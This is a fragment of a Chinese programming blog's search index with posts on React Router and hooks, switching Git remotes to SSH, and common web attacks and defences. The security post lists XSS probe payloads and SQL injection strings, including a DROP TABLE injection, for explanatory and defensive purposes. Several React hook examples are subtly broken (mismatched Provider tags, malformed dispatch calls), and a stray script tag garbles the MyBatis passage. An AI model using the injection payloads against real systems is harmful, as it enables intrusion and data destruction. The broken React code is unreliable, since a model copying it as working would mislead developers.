class=\"line\"><span class=\"string\">        &lt;BrowserRouter&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;ul&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;li&gt;&lt;Link to=&quot;/page1&quot;&gt;Page1&lt;/Link&gt;&lt;/li&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;li&gt;&lt;Link to=&quot;/page2&quot;&gt;Page2&lt;/Link&gt;&lt;/li&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;li&gt;&lt;Link to=&quot;/page3&quot;&gt;Page3&lt;/Link&gt;&lt;/li&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;/ul&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            &lt;Route exact path=&quot;/page1&quot; component=&#123;Page1&#125;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;Route path=&quot;/page2&quot; component=&#123;Page2&#125;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;Route path=&quot;/page3&quot; component=&#123;Page3&#125;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/BrowserRouter&gt;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">export default GlobalRouter;</span></span><br></pre></td></tr></table></figure>\n<p>路由可以嵌套多层，但是子路由需要完整路径</p>\n<p>精确匹配：<code>&lt;Route exact path=&quot;/&quot; component=&#123;Page&#125;/&gt;</code></p>\n<p>动态传值：<code>&lt;Route path=&quot;/page/:id&quot; component=&#123;Page&#125;/&gt;</code>，Page中<code>let id = this.props.match.params.id</code>获取<code>id</code></p>\n<p>重定向：<br>标签式：<br><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Redirect&#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react-router-dom&#x27;</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Redirect</span> <span class=\"attr\">to</span>=<span class=\"string\">&quot;/page1&quot;</span>/&gt;</span></span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>编程式：<br><code>this.props.history.push(&quot;/page1&quot;)</code></p>\n<p>动态路由：<br><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> routeConfig = [</span><br><span class=\"line\">    &#123;<span class=\"attr\">path</span>:<span class=\"string\">&quot;/page1&quot;</span>,<span class=\"attr\">title</span>:<span class=\"string\">&quot;page1&quot;</span>,<span class=\"attr\">exact</span>:<span class=\"literal\">true</span>,<span class=\"attr\">component</span>:Page1&#125;,</span><br><span class=\"line\">    &#123;<span class=\"attr\">path</span>:<span class=\"string\">&quot;/page2&quot;</span>,<span class=\"attr\">title</span>:<span class=\"string\">&quot;page2&quot;</span>,<span class=\"attr\">exact</span>:<span class=\"literal\">true</span>,<span class=\"attr\">component</span>:Page2&#125;,</span><br><span class=\"line\">    &#123;<span class=\"attr\">path</span>:<span class=\"string\">&quot;/page3&quot;</span>,<span class=\"attr\">title</span>:<span class=\"string\">&quot;page3&quot;</span>,<span class=\"attr\">exact</span>:<span class=\"literal\">true</span>,<span class=\"attr\">component</span>:Page3&#125;,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure><br>依据数据生成Router标签</p>\n<h1 id=\"React-hooks\"><a href=\"#React-hooks\" class=\"headerlink\" title=\"React-hooks\"></a>React-hooks</h1><h2 id=\"useState\"><a href=\"#useState\" class=\"headerlink\" title=\"useState\"></a>useState</h2><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Example</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(props)</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.state = &#123;<span class=\"attr\">count</span>:<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.addCount = <span class=\"built_in\">this</span>.addCount.bind(<span class=\"built_in\">this</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">                <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Count:&#123;this.state.count&#125;<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">                <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;this.addCount&#125;</span>&gt;</span>click<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">addCount</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.setState(&#123;<span class=\"attr\">count</span>:<span class=\"built_in\">this</span>.state.count+<span class=\"number\">1</span>&#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React,&#123; useState &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Example</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [count,setCount] = useState(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">        <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Count:&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span>=&gt;</span>&#123;setCount(count+1)&#125;&#125;&gt;click<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>hooks使用了useState，定义了一个count和setCount方法，提供了一个getter和setter。于是可以避免写class，直接用function就可以定义一个有状态的组件。</p>\n<p>useState必须顺序申明，不能存在于条件判断句子中。</p>\n<h2 id=\"useEffect\"><a href=\"#useEffect\" class=\"headerlink\" title=\"useEffect\"></a>useEffect</h2><p>useEffect替代了生命周期函数：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React,&#123; useState, useEffect &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Example</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">    useEffect(<span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;componentDidMount&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;componentWillUmount&#x27;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,[count])</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>第二个参数，监听数据的状态改变，当数组中的数据改变，才执行return返回的解绑前函数，当数组为<code>[]</code>，则当组件卸载时，才执行解绑函数。</p>\n<h2 id=\"useContext\"><a href=\"#useContext\" class=\"headerlink\" title=\"useContext\"></a>useContext</h2><p>解决父子组件传值的问题<br><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React,&#123; useContext, createContext, useState&#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> CounterContext = createContext(&#123;&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Counter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> count = useContext(CounterContext)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Example</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [count,setCount] = useState(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">        <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Count:&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span>=&gt;</span>&#123;setCount(count+1)&#125;&#125;&gt;click<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">CountContext.Provider</span> <span class=\"attr\">value</span>=<span class=\"string\">&#123;count&#125;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">                <span class=\"tag\">&lt;<span class=\"name\">Counter</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;/<span class=\"name\">CounterProvider.Provider</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">    )</span></span><br><span class=\"line\"><span class=\"xml\">&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"useReducer\"><a href=\"#useReducer\" class=\"headerlink\" title=\"useReducer\"></a>useReducer</h2><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React,&#123; useReducer, useState&#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Example</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [count,dispatch] = useReducer(<span class=\"function\">(<span class=\"params\">state,action</span>)=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span>(action.type) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;add&#x27;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> state+<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;sub&#x27;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> state-<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"attr\">default</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> state</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">        <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>now count is:&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span>=&gt;</span>&#123;dispatch(&#x27;add&#x27;&#125;&#125;&gt;increase<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span>=&gt;</span>&#123;dispatch(&#x27;sub&#x27;&#125;&#125;&gt;decrease<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>和useContext使用，达到代替redux的效果</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React,&#123; useContext, createContext, useState&#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> ColorContext = createContext(&#123;&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> reducer = <span class=\"function\">(<span class=\"params\">state,action</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(action.type)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;update_color&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> action.color;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Color</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [color,dispatch] = useReducer(reducer,<span class=\"string\">&#x27;blue&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">        <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">ColorContext.Provider</span> <span class=\"attr\">value</span>=<span class=\"string\">&#123;&#123;color:</span>&#x27;<span class=\"attr\">blue</span>&#x27;&#125;&#125;&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            &#123;props.children&#125;</span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;/<span class=\"name\">ColorProvider.Provider</span>&gt;</span></span></span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ShowArea</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123;color&#125; = useContext(ColorContext)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">&#123;&#123;color:color&#125;&#125;</span>&gt;</span>font color is &#123;color&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Buttons</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123;dispatch&#125; = useContext(ColorContext) </span><br><span class=\"line\">    <span class=\"keyword\">return</span></span><br><span class=\"line\">    (&lt;div&gt;</span><br><span class=\"line\">        <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span>=&gt;</span>&#123;dispatch(type:&#x27;update_color&#x27;,color:&#x27;red&#x27;)&#125;&gt;red<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\">        <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span>=&gt;</span>&#123;dispatch(type:&#x27;update_color&#x27;,color:&#x27;yellow&#x27;)&#125;&gt;yellow<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\">    &lt;/&gt;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Example</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">        <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Color</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">ShowArea</span>/&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">Buttons</span>/&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;/<span class=\"name\">Color</span>&gt;</span></span></span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"useMemo\"><a href=\"#useMemo\" class=\"headerlink\" title=\"useMemo\"></a>useMemo</h2><p>useMemo解决hooks性能问题，解决生命周期中shouldComponentUpdate的更新问题。</p>\n<h2 id=\"useRef\"><a href=\"#useRef\" class=\"headerlink\" title=\"useRef\"></a>useRef</h2><p>useRef用于获取DOM和保存变量</p>\n<h2 id=\"自定义hooks函数\"><a href=\"#自定义hooks函数\" class=\"headerlink\" title=\"自定义hooks函数\"></a>自定义hooks函数</h2><p>\u0001</p>\n","tags":["React"]},{"title":"将Git远程链接由HTTPS切换到SSH","url":"/2021/08/15/%E5%B0%86Git%E8%BF%9C%E7%A8%8B%E9%93%BE%E6%8E%A5%E7%94%B1HTTPS%E5%88%87%E6%8D%A2%E5%88%B0SSH/","content":"<p>起因是一个多月没写代码，才发现<code>git pull</code>用不了了，错误如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git pull</span><br><span class=\"line\">Username <span class=\"keyword\">for</span> <span class=\"string\">&#x27;https://github.com&#x27;</span>: XUranus</span><br><span class=\"line\">Password <span class=\"keyword\">for</span> <span class=\"string\">&#x27;https://XUranus@github.com&#x27;</span>:</span><br><span class=\"line\">remote: Support <span class=\"keyword\">for</span> password authentication was removed on August 13, 2021. Please use a personal access token instead.</span><br><span class=\"line\">remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\">fatal: unable to access <span class=\"string\">&#x27;https://github.com/xuranus/blog/&#x27;</span>: The requested URL returned error: 403</span><br></pre></td></tr></table></figure>\n<p>原来是2021年8月13日后Github为了防黑客禁止了密码验证方式，公告详见：<a href=\"https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/\">2020-12-15-token-authentication-requirements-for-git-operations</a>，意思是如果使用HTTPS进行Git操作需要使用token替换原来的密码。</p>\n<span id=\"more\"></span>\n<h2 id=\"使用HTTPS-token\"><a href=\"#使用HTTPS-token\" class=\"headerlink\" title=\"使用HTTPS + token\"></a>使用HTTPS + token</h2><p>token是一个有使用期限的hash，需要登录Github后在Setting =&gt; Developer Setting中定期生成，token用于执行Git操作时验证账户，也可以用来访问Github API。token的生成方式见：<a href=\"https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token\">creating-a-personal-access-token</a></p>\n<p>但是token使用繁琐，感觉用一串随机hash用来替代密码还不如用SSH，另外一种解决方法就是抛弃HTTPS链接，使用SSH。</p>\n<h2 id=\"使用SSH\"><a href=\"#使用SSH\" class=\"headerlink\" title=\"使用SSH\"></a>使用SSH</h2><ol>\n<li><p>确定你的Git已设置用户名和邮箱</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name &quot;YourName&quot;</span><br><span class=\"line\">git config --global user.email &quot;email@mail.com&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看你的<code>~/home</code>目录下是否已经生成过<code>ssh-key</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ll ~/.ssh</span><br></pre></td></tr></table></figure>\n<p>如果目录不存在或者没有看到<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件就新建一个<code>ssh-key</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&quot;email@mail.com&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 确保email地址相同</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>向你的远程Git仓库加入你的公钥</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>测试<code>ssh-key</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ssh -T git@github.com</span><br><span class=\"line\"><span class=\"comment\"># Hi XUranus! You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>对于本地remote已经是HTTPS的repo，转换本地连接远程Git的地址</p>\n</li>\n</ol>\n<p>修改<code>.git/config</code>文件：<br>把<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = http://github.com/YourName/project.git</span><br></pre></td></tr></table></figure><br>改为<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = git@github.com/YourName/project.git</span><br></pre></td></tr></table></figure><br>或者用命令行操作：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git remote -v <span class=\"comment\"># 查看remote</span></span><br><span class=\"line\">git remote set-url origin git@github:YourName/project.git <span class=\"comment\"># 重新设置remote url</span></span><br></pre></td></tr></table></figure></p>\n<p>修改完后，再次<code>git pull</code>，大功告成！</p>\n","tags":["Git"]},{"title":"常见Web攻击与应对方式","url":"/2021/04/07/%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB%E4%B8%8E%E5%BA%94%E5%AF%B9%E6%96%B9%E5%BC%8F/","content":"<blockquote>\n<p>总结和概括一下常见的Web安全注意点</p>\n</blockquote>\n<h2 id=\"XSS攻击\"><a href=\"#XSS攻击\" class=\"headerlink\" title=\"XSS攻击\"></a>XSS攻击</h2><p>XSS(Cross Site Script)攻击，是攻击者想Web页面提交恶意脚本，当用户浏览页面的时候就会触发脚本。</p>\n<h3 id=\"攻击思路\"><a href=\"#攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路</h3><ol>\n<li>盗取Cookie，模拟用户登录。用<code>document.cookie</code>获取cookie然后发送给某个后台服务器</li>\n<li>弹出”Flash插件已过期”的提示，欺骗用户去钓鱼页下载被种下木马的插件</li>\n</ol>\n<h3 id=\"检测方式\"><a href=\"#检测方式\" class=\"headerlink\" title=\"检测方式\"></a>检测方式</h3><p>一般的检测方式是检测弹窗，看能否执行<code>alert(1)</code></p>\n<ul>\n<li>对提交后展示的文本，输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>\n<li>提交插入图片的连接，输入<code>javascript:alert(1)</code>，图片元素会被渲染成<code>&lt;img src=&quot;javascript:alert(1)&quot;&gt;</code></li>\n</ul>\n<span id=\"more\"></span>\n<h3 id=\"预防方式\"><a href=\"#预防方式\" class=\"headerlink\" title=\"预防方式\"></a>预防方式</h3><ul>\n<li>后端对<code>&lt;&gt;</code>使用<code>&amp;lt;&amp;gt</code>对输入内容转义，或者node用<code>encodeURI</code>对文本转义</li>\n<li>使用React可以避免XSS攻击，只有明确需要嵌入html代码的时候，使用<code>&lt;span dangerouslySetInnerHTML=&#123;&#123;\"__html\":data&#125;&#125;&gt;&lt;/span&gt;</code></li>\n</ul>\n<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>SQL注入是通过构造输入，改变服务端的SQL执行逻辑。例一条登录判断的SQL：<code>select * from user where username = &#39;&quot; + username + &quot;&#39; and password = &#39;&quot; + password + &quot;&#39;&quot;</code>。对于任何用户名，构造以下输入作为密码：</p>\n<ul>\n<li><code>&#39; or &#39;1&#39;=&#39;1</code></li>\n<li><code>&#39; or &#39;1&#39;=&#39;1&#39; --</code></li>\n<li><code>&#39; or &#39;1&#39;=&#39;1&#39; /*</code></li>\n</ul>\n<p>实际上最终执行的SQL是<code>select * from user where username = &#39;xxx&#39; and password = &#39;&#39; or &#39;1&#39;=&#39;1&#39;</code>，这条一定可以查找到用户实现登录。</p>\n<h3 id=\"攻击思路-1\"><a href=\"#攻击思路-1\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路</h3><ul>\n<li>构造多条语句：<code>&#39; or &#39;1&#39;=&#39;1&#39;; DROP TABLE user; --</code>，删库。也可用来修改用户密码，创建新用户</li>\n<li>UDF反弹Shell，对服务器提权</li>\n</ul>\n<h3 id=\"检测方式-1\"><a href=\"#检测方式-1\" class=\"headerlink\" title=\"检测方式\"></a>检测方式</h3><p>单引号检测，一般老式php，asp项目存在SQL注入点的时候遇到单引号输入会报错</p>\n<h3 id=\"预防方式-1\"><a href=\"#预防方式-1\" class=\"headerlink\" title=\"预防方式\"></a>预防方式</h3><p>使用SQL的预编译功能</p>\n<p>JDBC的PreparedStatment继承自Statement，Statement执行SQL语句（包含参数）会直接发给DBMS，编译后直接执行；PreparedStatement执行SQL先将用?作为占位符的SQL语句模板发给DBMS先编译，之后直接运行编译后的SQL语句，参数在执行阶段传入。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;selectPerson&quot;</span> <span class=\"attr\">parameterType</span>=<span class=\"string\">&quot;int&quot;</span> <span class=\"attr\">resultType</span>=<span class=\"string\">&quot;hashmap&quot;</span>&gt;</span></span><br><span class=\"line\">  SELECT * FROM PERSON WHERE ID = #&#123;id&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;selectPerson&quot;</span> <span class=\"attr\">parameterType</span>=<span class=\"string\">&quot;int&quot;</span> <span class=\"attr\">resultType</span>=<span class=\"string\">&quot;hashmap&quot;</span>&gt;</span></span><br><span class=\"line\">  SELECT * FROM PERSON WHERE ID = $&#123;id&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Mybatis中有两种参数传递的方式：<code>#&#123;&#125;</code>、<script type=\"math/tex\">{}`，两者的差异就在于，`#`是在预编译后，执行语句时再传递参数，`</script>是先传递参数，然后再执行编译，再执行语句。为了避免被SQL注入，应采用<code>#</code>传参。</p>\n<h2 id=\"CSRF攻击\"><a href=\"#CSRF攻击\" class=\"headerlink\" title=\"CSRF攻击\"></a>CSRF攻击</h2><p>CSRF（cross-site request forgery），跨站请求伪造。攻击者可以通过冒用你的身份执行某些请求。</p>\n<p>完成一次CSRF攻击，被攻击人必须：</p>\n<ol>\n<li>登录受信任网站A，并在本地生成Cookie</li>\n<li>在不登出A（Cookie没有过期）的情况下，访问危险网站B。</li>\n</ol>\n<h3 id=\"攻击案例\"><a href=\"#攻击案例\" class=\"headerlink\" title=\"攻击案例\"></a>攻击案例</h3><ol>\n<li><p>站点A的某个接口以GET请求完成银行转账操作：<code>GET 